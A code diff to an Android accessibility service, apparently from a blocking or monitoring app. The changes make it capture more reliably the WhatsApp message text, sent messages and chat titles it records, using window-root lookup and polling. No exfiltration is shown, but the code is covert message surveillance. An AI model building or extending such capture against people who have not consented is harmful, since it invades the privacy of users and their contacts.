@@ -453,9 +453,12 @@ class BlockAccessibilityService : AccessibilityService() {
                 ((currentForegroundApp == "com.whatsapp" || currentForegroundApp == "com.whatsapp.w4b") &&
                  (packageName.startsWith("com.google.android.inputmethod") || packageName.contains("honeyboard") || packageName.contains("keyboard")))
         if (isWhatsAppActive) {
+            if ((packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") && whatsAppPollRunnable == null) {
+                startWhatsAppPolling()
+            }
             // Track composer text from entry node or event source
             try {
-                val root = rootInActiveWindow
+                val root = getWhatsAppWindowRoot(event.source ?: rootInActiveWindow)
                 val entryNode = root?.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")?.firstOrNull()
                 val currentText = entryNode?.text?.toString()?.trim()
                 if (!currentText.isNullOrBlank() && !currentText.equals("Type a message", ignoreCase = true) && !currentText.equals("Message", ignoreCase = true)) {
@@ -487,9 +490,10 @@ class BlockAccessibilityService : AccessibilityService() {
 
                         if (isSendClick) {
                             var sentText = lastWhatsAppComposerText
+                            val waRoot = getWhatsAppWindowRoot(event.source ?: rootInActiveWindow)
                             if (sentText.isNullOrBlank()) {
                                 try {
-                                    val entry = rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")?.firstOrNull()
+                                    val entry = waRoot?.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")?.firstOrNull()
                                     val et = entry?.text?.toString()?.trim()
                                     if (!et.isNullOrBlank() && !et.equals("Type a message", ignoreCase = true) && !et.equals("Message", ignoreCase = true)) {
                                         sentText = et
@@ -497,7 +501,7 @@ class BlockAccessibilityService : AccessibilityService() {
                                 } catch (_: Exception) {}
                             }
 
-                            val chatTitle = getWhatsAppCurrentChatTitle(rootInActiveWindow)
+                            val chatTitle = getWhatsAppCurrentChatTitle(waRoot)
                             val textToSend = sentText
                             if (!textToSend.isNullOrBlank() && !chatTitle.isNullOrBlank()) {
                                 val now = System.currentTimeMillis()
@@ -632,7 +636,7 @@ class BlockAccessibilityService : AccessibilityService() {
                 eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
                 eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
                 eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                val nodeToInspect = rootInActiveWindow ?: event.source
+                val nodeToInspect = getWhatsAppWindowRoot(event.source ?: rootInActiveWindow)
                 recordWhatsAppChatIfForeground(nodeToInspect)
             }
         }
@@ -878,11 +882,50 @@ class BlockAccessibilityService : AccessibilityService() {
         }
     }
 
+    fun getWhatsAppWindowRoot(fallback: AccessibilityNodeInfo? = null): AccessibilityNodeInfo? {
+        var candidate = fallback
+        while (candidate?.parent != null) {
+            candidate = candidate.parent
+        }
+        val candPkg = candidate?.packageName?.toString() ?: ""
+        if (candPkg == "com.whatsapp" || candPkg == "com.whatsapp.w4b") {
+            return candidate
+        }
+
+        try {
+            var active = rootInActiveWindow
+            while (active?.parent != null) {
+                active = active.parent
+            }
+            val activePkg = active?.packageName?.toString() ?: ""
+            if (activePkg == "com.whatsapp" || activePkg == "com.whatsapp.w4b") {
+                return active
+            }
+        } catch (_: Exception) {}
+
+        try {
+            val appWindow = windows?.firstOrNull {
+                it.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_APPLICATION &&
+                (it.root?.packageName == "com.whatsapp" || it.root?.packageName == "com.whatsapp.w4b")
+            }
+            if (appWindow?.root != null) {
+                var wRoot = appWindow.root
+                while (wRoot?.parent != null) {
+                    wRoot = wRoot.parent
+                }
+                return wRoot
+            }
+        } catch (_: Exception) {}
+
+        return candidate ?: try { rootInActiveWindow } catch (_: Exception) { null }
+    }
+
     private fun startWhatsAppPolling() {
         if (whatsAppPollRunnable != null) return
         val runnable = object : Runnable {
             override fun run() {
-                recordWhatsAppChatIfForeground(rootInActiveWindow)
+                val root = getWhatsAppWindowRoot()
+                recordWhatsAppChatIfForeground(root)
                 pollHandler.postDelayed(this, whatsAppPollIntervalMs)
             }
         }
@@ -1261,17 +1304,17 @@ class BlockAccessibilityService : AccessibilityService() {
     }
 
     fun recordWhatsAppChatIfForeground(root: AccessibilityNodeInfo?) {
-        if (root == null) return
-        val pkg = root.packageName?.toString() ?: ""
+        val actualRoot = getWhatsAppWindowRoot(root) ?: return
+        val pkg = actualRoot.packageName?.toString() ?: ""
         if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return
 
         // 1. Strict verification: ONLY record messages if user is inside an actual active WhatsApp conversation with composer!
         // Fast O(1) check: WhatsApp conversation always contains the input entry node.
         val entryNodes = try {
-            root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")
+            actualRoot.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")
         } catch (_: Exception) { null }
 
-        if (entryNodes.isNullOrEmpty() && !hasWhatsAppChatComposer(root, 0)) {
+        if (entryNodes.isNullOrEmpty() && !hasWhatsAppChatComposer(actualRoot, 0)) {
             // User is on home/conversations screen, not inside an active conversation thread.
             // Do not capture home chat list to minimize DB storage.
             return
@@ -1312,7 +1355,7 @@ class BlockAccessibilityService : AccessibilityService() {
             }
 
             // Find WhatsApp contact/group name in top action bar
-            val chatTitle = getWhatsAppCurrentChatTitle(root) ?: "WhatsApp Chat"
+            val chatTitle = getWhatsAppCurrentChatTitle(actualRoot) ?: "WhatsApp Chat"
 
             if (!chatTitle.equals("WhatsApp Chat", ignoreCase = true) && chatTitle.isNotBlank()) {
                 lastClickedWhatsAppChat = chatTitle
@@ -1358,7 +1401,7 @@ class BlockAccessibilityService : AccessibilityService() {
                     }
                 } catch (_: Exception) {}
             }
-            collectMessageNodes(root)
+            collectMessageNodes(actualRoot)
 
             for (node in candidateNodes) {
                 val t = node.text?.toString()?.trim()
